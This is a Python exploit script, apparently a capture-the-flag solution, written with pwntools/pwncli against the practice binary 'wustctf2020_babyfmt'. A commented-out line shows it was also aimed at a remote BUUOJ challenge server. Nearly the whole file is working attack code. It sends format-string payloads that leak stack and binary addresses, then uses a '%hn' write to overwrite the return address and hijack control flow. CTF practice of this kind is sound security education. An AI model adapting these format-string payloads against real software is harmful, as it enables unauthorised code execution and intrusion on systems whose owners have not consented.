#!/usr/bin/env python3
# Date: 2024-11-10 12:47:56
# Link: https://github.com/RoderickChan/pwncli

from pwncli import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './wustctf2020_babyfmt'
context.log_level = 'debug'
context.timeout = 5

gift.io = process('./wustctf2020_babyfmt')
# gift.io = remote('node5.buuoj.cn', 28532)
gift.elf = ELF('./wustctf2020_babyfmt')
gift.libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

def fmt_attack(payload):
    ru(b'>>')
    sl('2')
    s(payload)

debug('b fmt_attack')
sl('1')
sl('2')
sl('3')

fmt_attack(b'%7$n-%16$p+%17$p')

ru(b'-')
ret_addr = int(r(14), 16) - 0x28
ru(b'+')
elf_value = int(r(14), 16) - 0x102c


payload = ('%' + str((elf_value + 0xf56)&0xffff) + 'c' + '%10$hn').encode()
payload = payload.ljust(0x10, b'a')
payload += p64(ret_addr)
fmt_attack(payload)
print(r())
ia()
